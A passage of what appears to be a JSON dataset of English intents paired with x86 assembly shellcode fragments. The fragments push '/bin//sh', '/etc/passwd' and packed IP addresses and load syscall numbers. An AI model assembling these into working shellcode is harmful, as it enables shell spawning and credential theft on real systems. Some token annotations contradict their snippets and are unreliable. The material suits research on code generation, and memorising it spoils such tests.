    "intent": "put the syscall 37 into the eax register",
    "rewritten_intent": "put the syscall 37 into the eax register",
    "snippet": "push byte 37 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "37",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "37",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 3h onto the stack",
    "rewritten_intent": "push the byte 3h onto the stack",
    "snippet": "push byte 3h",
    "slot_map": {
      "3h": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the syscall 3h into the eax register",
    "rewritten_intent": "put the syscall 3h into the eax register",
    "snippet": "push byte 3h \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "3h",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "3h",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 4 onto the stack",
    "rewritten_intent": "push the byte 4 onto the stack",
    "snippet": "push byte 4",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "4",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "4"
    ]
  },
  {
    "intent": "put the syscall 4 into the eax register",
    "rewritten_intent": "put the syscall 4 into the eax register",
    "snippet": "push byte 4 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "4",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "4",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 49 onto the stack",
    "rewritten_intent": "push the byte 49 onto the stack",
    "snippet": "push byte 49",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "49",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "49"
    ]
  },
  {
    "intent": "put the syscall 49 into the eax register",
    "rewritten_intent": "put the syscall 49 into the eax register",
    "snippet": "push byte 49 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "49",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "49",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 5 onto the stack",
    "rewritten_intent": "push the byte 5 onto the stack",
    "snippet": "push byte 5",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "5",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "5"
    ]
  },
  {
    "intent": "put the syscall 5 into the eax register",
    "rewritten_intent": "put the syscall 5 into the eax register",
    "snippet": "push byte 5 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "5",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "5",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 54 onto the stack",
    "rewritten_intent": "push the byte 54 onto the stack",
    "snippet": "push byte 54",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "54",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "54"
    ]
  },
  {
    "intent": "put the syscall 54 into the eax register",
    "rewritten_intent": "put the syscall 54 into the eax register",
    "snippet": "push byte 54 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "54",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "54",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push byte 6 onto the stack",
    "rewritten_intent": "push byte 6 onto the stack",
    "snippet": "push byte 6",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "6",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "6"
    ]
  },
  {
    "intent": "push the byte 6 onto the stack",
    "rewritten_intent": "push the byte 6 onto the stack",
    "snippet": "push byte 6",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "6",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "6"
    ]
  },
  {
    "intent": "push the byte 6 to the stack",
    "rewritten_intent": "push the byte 6 to the stack",
    "snippet": "push byte 6",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "6",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "6"
    ]
  },
  {
    "intent": "put the syscall 6 into the eax register",
    "rewritten_intent": "put the syscall 6 into the eax register",
    "snippet": "push byte 6 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "6",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "6",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 67 onto the stack",
    "rewritten_intent": "push the byte 67 onto the stack",
    "snippet": "push byte 67",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "67",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "67"
    ]
  },
  {
    "intent": "put the syscall 67 into the eax register",
    "rewritten_intent": "put the syscall 67 into the eax register",
    "snippet": "push byte 67 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "67",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "67",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 70 onto the stack",
    "rewritten_intent": "push the byte 70 onto the stack",
    "snippet": "push byte 70",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "70",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "70"
    ]
  },
  {
    "intent": "put the syscall 70 into the eax register",
    "rewritten_intent": "put the syscall 70 into the eax register",
    "snippet": "push byte 70 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "70",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "70",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 8 onto the stack",
    "rewritten_intent": "push the byte 8 onto the stack",
    "snippet": "push byte 8",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "8",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "8"
    ]
  },
  {
    "intent": "put the syscall 8 into the eax register",
    "rewritten_intent": "put the syscall 8 into the eax register",
    "snippet": "push byte 8 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "8",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "8",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte 9 onto the stack",
    "rewritten_intent": "push the byte 9 onto the stack",
    "snippet": "push byte 9",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "byte",
      "9",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "9"
    ]
  },
  {
    "intent": "put the syscall 9 into the eax register",
    "rewritten_intent": "put the syscall 9 into the eax register",
    "snippet": "push byte 9 \\n pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "put",
      "syscall",
      "9",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "9",
      "\\n",
      "pop",
      "var0"
    ]
  },
  {
    "intent": "push the byte chmod_call onto the stack",
    "rewritten_intent": "push the byte chmod_call onto the stack",
    "snippet": "push byte chmod_call",
    "slot_map": {
      "chmod_call": "var0"
    },
    "intent_tokens": [
      "push",
      "byte",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0"
    ]
  },
  {
    "intent": "put the byte my_label into the eax register",
    "rewritten_intent": "put the byte my_label into the eax register",
    "snippet": "push byte CHMOD_CALL \\n pop eax",
    "slot_map": {
      "my_label": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "CHMOD_CALL",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "put the byte CHMOD_CALL into the eax register",
    "rewritten_intent": "put the byte CHMOD_CALL into the eax register",
    "snippet": "push byte CHMOD_CALL \\n pop eax",
    "slot_map": {
      "CHMOD_CALL": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "put the byte L1 into the eax register",
    "rewritten_intent": "put the byte L1 into the eax register",
    "snippet": "push byte L1 \\n pop eax",
    "slot_map": {
      "L1": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "put the byte my_value into the eax register",
    "rewritten_intent": "put the byte my_value into the eax register",
    "snippet": "push byte my_value \\n pop eax",
    "slot_map": {
      "my_value": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "put the byte VALUE into the eax register",
    "rewritten_intent": "put the byte VALUE into the eax register",
    "snippet": "push byte VALUE \\n pop eax",
    "slot_map": {
      "VALUE": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "put",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "byte",
      "var0",
      "\\n",
      "pop",
      "var1"
    ]
  },
  {
    "intent": "push the contents of the cx register onto the stack",
    "rewritten_intent": "push the contents of the cx register onto the stack",
    "snippet": "push cx",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "contents",
      "cx",
      "register",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "cx"
    ]
  },
  {
    "intent": "push the dword [ebp+16] onto the stack",
    "rewritten_intent": "push the dword [ebp+16] onto the stack",
    "snippet": "push dword [ebp+16]",
    "slot_map": {
      "ebp+16": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "[",
      "var1",
      "]",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "cx"
    ]
  },
  {
    "intent": "push the doubleword [edx+2] to the stack",
    "rewritten_intent": "push the doubleword [edx+2] to the stack",
    "snippet": "push dword [edx+2]",
    "slot_map": {
      "edx+2": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "[",
      "var1",
      "]",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "cx"
    ]
  },
  {
    "intent": "push the dword [edx+2] onto the stack",
    "rewritten_intent": "push the dword [edx+2] onto the stack",
    "snippet": "push dword [edx+2]",
    "slot_map": {
      "edx+2": "var1",
      "[": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "[",
      "var1",
      "]",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "cx"
    ]
  },
  {
    "intent": "push the doubleword 0x00000000 onto the stack",
    "rewritten_intent": "push the doubleword 0x00000000 onto the stack",
    "snippet": "push dword 0x00000000",
    "slot_map": {
      "0x00000000": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x0101017f onto the stack",
    "rewritten_intent": "push the dword 0x0101017f onto the stack",
    "snippet": "push dword 0x0101017f",
    "slot_map": {
      "0x0101017f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x017aa8c0 onto the stack",
    "rewritten_intent": "push the dword 0x017aa8c0 onto the stack",
    "snippet": "push dword 0x017aa8c0",
    "slot_map": {
      "0x017aa8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x0501a8c0 onto the stack",
    "rewritten_intent": "push the dword 0x0501a8c0 onto the stack",
    "snippet": "push dword 0x0501a8c0",
    "slot_map": {
      "0x0501a8c0": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x0a206873 onto the stack",
    "rewritten_intent": "push the double word 0x0a206873 onto the stack",
    "snippet": "push dword 0x0a206873",
    "slot_map": {
      "0x0a206873": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x10 onto the stack",
    "rewritten_intent": "push the dword 0x10 onto the stack",
    "snippet": "push dword 0x10",
    "slot_map": {
      "0x10": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 2 onto the stack",
    "rewritten_intent": "push the double word 2 onto the stack",
    "snippet": "push dword 0x2",
    "slot_map": {},
    "intent_tokens": [
      "push",
      "double",
      "word",
      "2",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "0x2"
    ]
  },
  {
    "intent": "push the dword 0x214c4f4c onto the stack",
    "rewritten_intent": "push the dword 0x214c4f4c onto the stack",
    "snippet": "push dword 0x214c4f4c",
    "slot_map": {
      "0x214c4f4c": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x2335738c onto the stack",
    "rewritten_intent": "push the double word 0x2335738c onto the stack",
    "snippet": "push dword 0x2335738c",
    "slot_map": {
      "0x2335738c": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register",
    "rewritten_intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register",
    "snippet": "push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov eax, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "0x7273752f": "var1",
      "eax": "var2"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "and",
      "double",
      "word",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "push",
      "dword",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ebx register to the stack register",
    "snippet": "push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ebx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "0x7273752f": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "and",
      "double",
      "word",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "push",
      "dword",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register",
    "rewritten_intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the ecx register to the stack register",
    "snippet": "push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov ecx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "0x7273752f": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "and",
      "double",
      "word",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "push",
      "dword",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register",
    "rewritten_intent": "push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register",
    "snippet": "push dword 0x2f2f2f2f \\n push dword 0x7273752f \\n mov edx, esp",
    "slot_map": {
      "0x2f2f2f2f": "var0",
      "0x7273752f": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "and",
      "double",
      "word",
      "var1",
      "stack",
      "and",
      "point",
      "var2",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "push",
      "dword",
      "var1",
      "\\n",
      "mov",
      "var2",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the dword 0x2f2f6e69 onto the stack",
    "rewritten_intent": "push the dword 0x2f2f6e69 onto the stack",
    "snippet": "push dword 0x2f2f6e69",
    "slot_map": {
      "0x2f2f6e69": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x2f2f6e69 to the stack",
    "rewritten_intent": "push the doubleword 0x2f2f6e69 to the stack",
    "snippet": "push dword 0x2f2f6e69",
    "slot_map": {
      "0x2f2f6e69": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x2f3a2f3a onto the stack",
    "rewritten_intent": "push the double word 0x2f3a2f3a onto the stack",
    "snippet": "push dword 0x2f3a2f3a",
    "slot_map": {
      "0x2f3a2f3a": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x2f3a3a30 onto the stack",
    "rewritten_intent": "push the dword 0x2f3a3a30 onto the stack",
    "snippet": "push dword 0x2f3a3a30",
    "slot_map": {
      "0x2f3a3a30": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x2f6e6962 onto the stack",
    "rewritten_intent": "push the double word 0x2f6e6962 onto the stack",
    "snippet": "push dword 0x2f6e6962",
    "slot_map": {
      "0x2f6e6962": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x303a3a31 onto the stack",
    "rewritten_intent": "push the double word 0x303a3a31 onto the stack",
    "snippet": "push dword 0x303a3a31",
    "slot_map": {
      "0x303a3a31": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the double word 0x313a303a onto the stack",
    "rewritten_intent": "push the double word 0x313a303a onto the stack",
    "snippet": "push dword 0x313a303a",
    "slot_map": {
      "0x313a303a": "var0"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push double word 0x39396e2d onto the stack and point the ebp register to the stack register",
    "rewritten_intent": "push double word 0x39396e2d onto the stack and point the ebp register to the stack register",
    "snippet": "push dword 0x39396e2d \\n mov ebp, esp",
    "slot_map": {
      "0x39396e2d": "var0",
      "ebp": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x39396e2d onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push double word 0x39396e2d onto the stack and point the ebx register to the stack register",
    "snippet": "push dword 0x39396e2d \\n mov ebx, esp",
    "slot_map": {
      "0x39396e2d": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x39396e2d onto the stack and point the edi register to the stack register",
    "rewritten_intent": "push double word 0x39396e2d onto the stack and point the edi register to the stack register",
    "snippet": "push dword 0x39396e2d \\n mov edi, esp",
    "slot_map": {
      "0x39396e2d": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push double word 0x39396e2d onto the stack and point the esi register to the stack register",
    "rewritten_intent": "push double word 0x39396e2d onto the stack and point the esi register to the stack register",
    "snippet": "push dword 0x39396e2d \\n mov esi, esp",
    "slot_map": {
      "0x39396e2d": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "push",
      "double",
      "word",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the dword 0x3a303a3a onto the stack",
    "rewritten_intent": "push the dword 0x3a303a3a onto the stack",
    "snippet": "push dword 0x3a303a3a",
    "slot_map": {
      "0x3a303a3a": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x4227a28b onto the stack",
    "rewritten_intent": "push the doubleword 0x4227a28b onto the stack",
    "snippet": "push dword 0x4227a28b",
    "slot_map": {
      "0x4227a28b": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x45525649 onto the stack",
    "rewritten_intent": "push the dword 0x45525649 onto the stack",
    "snippet": "push dword 0x45525649",
    "slot_map": {
      "0x45525649": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x58494741 onto the stack",
    "rewritten_intent": "push the dword 0x58494741 onto the stack",
    "snippet": "push dword 0x58494741",
    "slot_map": {
      "0x58494741": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x5f657a69 onto the stack",
    "rewritten_intent": "push the dword 0x5f657a69 onto the stack",
    "snippet": "push dword 0x5f657a69",
    "slot_map": {
      "0x5f657a69": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x6164732f onto the stack",
    "rewritten_intent": "push the dword 0x6164732f onto the stack",
    "snippet": "push dword 0x6164732f",
    "slot_map": {
      "0x6164732f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x61702f2f onto the stack",
    "rewritten_intent": "push the dword 0x61702f2f onto the stack",
    "snippet": "push dword 0x61702f2f",
    "slot_map": {
      "0x61702f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x61702f63 onto the stack",
    "rewritten_intent": "push the dword 0x61702f63 onto the stack",
    "snippet": "push dword 0x61702f63",
    "slot_map": {
      "0x61702f63": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x61722f6c onto the stack",
    "rewritten_intent": "push the dword 0x61722f6c onto the stack",
    "snippet": "push dword 0x61722f6c",
    "slot_map": {
      "0x61722f6c": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x61747069 to the stack",
    "rewritten_intent": "push the doubleword 0x61747069 to the stack",
    "snippet": "push dword 0x61747069",
    "slot_map": {
      "0x61747069": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x61747069 onto the stack",
    "rewritten_intent": "push the dword 0x61747069 onto the stack",
    "snippet": "push dword 0x61747069",
    "slot_map": {
      "0x61747069": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x62732f2f onto the stack",
    "rewritten_intent": "push the dword 0x62732f2f onto the stack",
    "snippet": "push dword 0x62732f2f",
    "slot_map": {
      "0x62732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x62732f2f to the stack",
    "rewritten_intent": "push the doubleword 0x62732f2f to the stack",
    "snippet": "push dword 0x62732f2f",
    "slot_map": {
      "0x62732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register",
    "rewritten_intent": "push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register",
    "snippet": "push dword 0x62732f2f \\n mov ebx, esp",
    "slot_map": {
      "0x62732f2f": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "push",
      "doubleword",
      "var0",
      "stack",
      "and",
      "point",
      "var1",
      "register",
      "stack",
      "register"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0",
      "\\n",
      "mov",
      "var1",
      ",",
      "esp"
    ]
  },
  {
    "intent": "push the dword 0x6374652f onto the stack",
    "rewritten_intent": "push the dword 0x6374652f onto the stack",
    "snippet": "push dword 0x6374652f",
    "slot_map": {
      "0x6374652f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x64616568 onto the stack",
    "rewritten_intent": "push the dword 0x64616568 onto the stack",
    "snippet": "push dword 0x64616568",
    "slot_map": {
      "0x64616568": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x64777373 onto the stack",
    "rewritten_intent": "push the dword 0x64777373 onto the stack",
    "snippet": "push dword 0x64777373",
    "slot_map": {
      "0x64777373": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x656e7265 onto the stack",
    "rewritten_intent": "push the dword 0x656e7265 onto the stack",
    "snippet": "push dword 0x656e7265",
    "slot_map": {
      "0x656e7265": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x68732f2f onto the stack",
    "rewritten_intent": "push the dword 0x68732f2f onto the stack",
    "snippet": "push dword 0x68732f2f",
    "slot_map": {
      "0x68732f2f": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
      "stack"
    ],
    "snippet_tokens": [
      "push",
      "dword",
      "var0"
    ]
  },
  {
    "intent": "push the dword 0x68732f63 onto the stack",
    "rewritten_intent": "push the dword 0x68732f63 onto the stack",
    "snippet": "push dword 0x68732f63",
    "slot_map": {
      "0x68732f63": "var0"
    },
    "intent_tokens": [
      "push",
      "dword",
      "var0",
